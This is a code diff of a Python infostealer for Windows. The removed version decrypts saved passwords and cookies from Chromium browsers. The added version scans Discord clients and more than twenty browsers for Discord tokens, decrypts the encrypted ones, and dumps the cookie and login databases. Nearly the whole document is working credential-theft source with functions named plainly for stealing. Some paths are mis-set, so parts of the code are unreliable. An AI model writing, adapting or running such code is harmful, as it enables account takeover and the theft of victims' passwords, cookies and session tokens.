@@ -1,169 +1,191 @@
 import os
-import re
 import json
+import base64
+import re
 import sqlite3
-import shutil
-from base64 import b64decode
-from Crypto.Cipher import AES
 import win32crypt
+from Crypto.Cipher import AES
+import shutil
+import requests
 
-def get_browser_paths():
-    """Get paths for all supported browsers"""
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    
+APPDATA = os.getenv('LOCALAPPDATA')
+LOCALAPPDATA = os.getenv('LOCALAPPDATA')
+
+REGEX = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
+REGEX_ENC = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
+
+def get_paths():
     return {
-        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
-        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
-        'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
-        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
-        'OperaGX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable')
+        "Discord": os.path.join(APPDATA, "discord"),
+        "Discord Canary": os.path.join(APPDATA, "discordcanary"),
+        "Lightcord": os.path.join(APPDATA, "Lightcord"),
+        "Discord PTB": os.path.join(APPDATA, "discordptb"),
+        "Opera": os.path.join(APPDATA, "Opera Software", "Opera Stable"),
+        "Opera GX": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
+        "Amigo": os.path.join(LOCALAPPDATA, "Amigo", "User Data"),
+        "Torch": os.path.join(LOCALAPPDATA, "Torch", "User Data"),
+        "Kometa": os.path.join(LOCALAPPDATA, "Kometa", "User Data"),
+        "Orbitum": os.path.join(LOCALAPPDATA, "Orbitum", "User Data"),
+        "CentBrowse": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"),
+        "7Sta": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"),
+        "Sputnik": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
+        "Vivaldi": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"),
+        "Chrome SxS": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
+        "Chrome": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
+        "FireFox": os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles"),
+        "Epic Privacy Browse": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
+        "Microsoft Edge": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
+        "Uran": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
+        "Yandex": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
+        "Brave": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")
     }
 
-def get_master_key(browser_path):
-    """Extract the master encryption key from browser's Local State"""
-    local_state_path = os.path.join(browser_path, 'Local State')
-    if not os.path.exists(local_state_path):
-        return None
-    
-    with open(local_state_path, 'r', encoding='utf-8') as f:
-        local_state = json.load(f)
-    
-    encrypted_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
-    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+def SafeStorageSteal(path: str) -> list[str]:
+    encryptedTokens = []
+    tokens = []
+    key = None
+    levelDbPaths = []
 
-def decrypt_password(cipher, encrypted_data):
-    """Decrypt password using AES-GCM cipher"""
-    iv = encrypted_data[3:15]
-    payload = encrypted_data[15:-16]
-    return cipher.decrypt(payload).decode()
+    localStatePath = os.path.join(path, "Local State")
 
-def process_browser(browser_name, browser_path, master_key):
-    """Process a single browser to extract passwords and cookies"""
-    results = {'passwords': [], 'cookies': []}
-    cipher = AES.new(master_key, AES.MODE_GCM, b' ' * 12)  # Dummy IV, will be replaced
-    
-    # Process passwords
-    login_data_path = os.path.join(browser_path, 'Login Data')
-    if os.path.exists(login_data_path):
-        temp_db = 'temp_login.db'
+    for root, dirs, _ in os.walk(path):
+        for dir in dirs:
+            if dir == "leveldb":
+                levelDbPaths.append(os.path.join(root, dir))
+
+    if os.path.isfile(localStatePath) and levelDbPaths:
+        with open(localStatePath, errors="ignore") as file:
+            jsonContent = json.load(file)
+
+        key = jsonContent['os_crypt']['encrypted_key']
+        key = base64.b64decode(key)[5:]
+
+        for levelDbPath in levelDbPaths:
+            for file in os.listdir(levelDbPath):
+                if file.endswith((".log", ".ldb")):
+                    filepath = os.path.join(levelDbPath, file)
+                    with open(filepath, errors="ignore") as file:
+                        lines = file.readlines()
+
+                    for line in lines:
+                        if line.strip():
+                            matches = re.findall(REGEX_ENC, line)
+                            for match in matches:
+                                match = match.rstrip("\\")
+                                if match not in encryptedTokens:
+                                    match = match.split("dQw4w9WgXcQ:")[1].encode()
+                                    missing_padding = 4 - (len(match) % 4)
+                                    if missing_padding:
+                                        match += b'=' * missing_padding
+                                    match = base64.b64decode(match)
+                                    encryptedTokens.append(match)
+
+    for token in encryptedTokens:
         try:
-            shutil.copy2(login_data_path, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-            
-            for url, username, encrypted_password in cursor.fetchall():
-                if not url or not username or not encrypted_password:
-                    continue
-                
-                try:
-                    decrypted = decrypt_password(cipher, encrypted_password)
-                    results['passwords'].append({
-                        'browser': browser_name,
-                        'url': url,
-                        'username': username,
-                        'password': decrypted
-                    })
-                except:
-                    continue
-            
-            conn.close()
-        except Exception as e:
+            token = AES.new(key, AES.MODE_GCM, nonce=token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
+            if token:
+                tokens.append(token)
+        except Exception:
             pass
-        finally:
-            if os.path.exists(temp_db):
-                os.remove(temp_db)
-    
-    # Process cookies
-    cookies_path = os.path.join(browser_path, 'Network', 'Cookies')
-    if os.path.exists(cookies_path):
-        temp_db = 'temp_cookies.db'
-        try:
-            shutil.copy2(cookies_path, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
-            
-            for host, name, encrypted_cookie in cursor.fetchall():
-                if not host or not name or not encrypted_cookie:
-                    continue
-                
-                try:
-                    decrypted = decrypt_password(cipher, encrypted_cookie)
-                    results['cookies'].append({
-                        'browser': browser_name,
-                        'host': host,
-                        'name': name,
-                        'value': decrypted
-                    })
-                except:
-                    continue
-            
-            conn.close()
-        except Exception as e:
-            pass
-        finally:
-            if os.path.exists(temp_db):
-                os.remove(temp_db)
-    
-    return results
 
-def steal_passwords():
-    """Main function to steal all passwords from browsers"""
-    all_results = {'passwords': [], 'cookies': []}
-    browser_paths = get_browser_paths()
-    
-    for browser_name, base_path in browser_paths.items():
-        if not os.path.exists(base_path):
-            continue
-        
-        # Handle Chrome profiles
-        if browser_name == 'Chrome':
-            for item in os.listdir(base_path):
-                if item.startswith('Profile ') or item == 'Default':
-                    profile_path = os.path.join(base_path, item)
-                    master_key = get_master_key(base_path)
-                    if master_key:
-                        results = process_browser(
-                            f'Chrome ({item})', 
-                            profile_path, 
-                            master_key
-                        )
-                        all_results['passwords'].extend(results['passwords'])
-                        all_results['cookies'].extend(results['cookies'])
-        
-        # Handle other browsers
-        else:
-            master_key = get_master_key(base_path)
-            if master_key:
-                results = process_browser(browser_name, base_path, master_key)
-                all_results['passwords'].extend(results['passwords'])
-                all_results['cookies'].extend(results['cookies'])
-    
-    return all_results
+    return tokens
 
-def format_results(data, data_type):
-    """Format the stolen data into a readable string"""
-    if data_type == 'passwords':
-        output = []
-        for item in data:
-            output.append(f"Browser: {item['browser']}")
-            output.append(f"URL: {item['url']}")
-            output.append(f"Username: {item['username']}")
-            output.append(f"Password: {item['password']}")
-            output.append("")
-        return "\n".join(output)
-    
-    elif data_type == 'cookies':
-        output = []
-        for item in data:
-            output.append(f"Browser: {item['browser']}")
-            output.append(f"Host: {item['host']}")
-            output.append(f"Name: {item['name']}")
-            output.append(f"Value: {item['value']}")
-            output.append("")
-        return "\n".join(output)
-    
-    return "No data found"
+def SimpleSteal(path: str) -> list[str]:
+    tokens = []
+    levelDbPaths = []
+
+    for root, dirs, _ in os.walk(path):
+        for dir in dirs:
+            if dir == "leveldb":
+                levelDbPaths.append(os.path.join(root, dir))
+
+    for levelDbPath in levelDbPaths:
+        for file in os.listdir(levelDbPath):
+            if file.endswith((".log", ".ldb")):
+                filepath = os.path.join(levelDbPath, file)
+                with open(filepath, errors="ignore") as file:
+                    lines = file.readlines()
+
+                for line in lines:
+                    if line.strip():
+                        matches = re.findall(REGEX, line.strip())
+                        for match in matches:
+                            match = match.rstrip("\\")
+                            if not match in tokens:
+                                tokens.append(match)
+
+    return tokens
+
+def FireFoxSteal(path: str) -> list[str]:
+    tokens = []
+
+    for root, _, files in os.walk(path):
+        for file in files:
+            if file.lower().endswith(".sqlite"):
+                filepath = os.path.join(root, file)
+                with open(filepath, errors="ignore") as file:
+                    lines = file.readlines()
+
+                    for line in lines:
+                        if line.strip():
+                            matches = re.findall(REGEX, line)
+                            for match in matches:
+                                match = match.rstrip("\\")
+                                if not match in tokens:
+                                    tokens.append(match)
+
+    return tokens
+
+def get_cookies(browser_path):
+    cookies = []
+    db_path = os.path.join(browser_path, 'Cookies')
+    if os.path.exists(db_path):
+        conn = sqlite3.connect(db_path)
+        cursor = conn.cursor()
+        cursor.execute("SELECT name, value, host_key, path, is_secure, expires_utc, last_access_utc, has_expires, is_httponly, is_persistent, priority, samesite, source_scheme, source_port, is_same_site_lax FROM cookies")
+        for row in cursor.fetchall():
+            cookies.append(row)
+        conn.close()
+    return cookies
+
+def get_passwords(browser_path):
+    passwords = []
+    db_path = os.path.join(browser_path, 'Login Data')
+    if os.path.exists(db_path):
+        conn = sqlite3.connect(db_path)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins")
+        for row in cursor.fetchall():
+            passwords.append(row)
+        conn.close()
+    return passwords
+
+def steal_browser_data(browser_name, browser_path):
+    cookies = get_cookies(browser_path)
+    passwords = get_passwords(browser_path)
+    return {
+        'browser': browser_name,
+        'cookies': cookies,
+        'passwords': passwords
+    }
+
+def main():
+    paths = get_paths()
+    all_data = {}
+
+    for name, path in paths.items():
+        if os.path.exists(path):
+            all_data[name] = steal_browser_data(name, path)
+
+    return all_data
+
+if __name__ == "__main__":
+    data = main()
+    for browser, info in data.items():
+        print(f"Browser: {browser}")
+        print("Cookies:")
+        for cookie in info['cookies']:
+            print(cookie)
+        print("Passwords:")
+        for password in info['passwords']:
+            print(password)
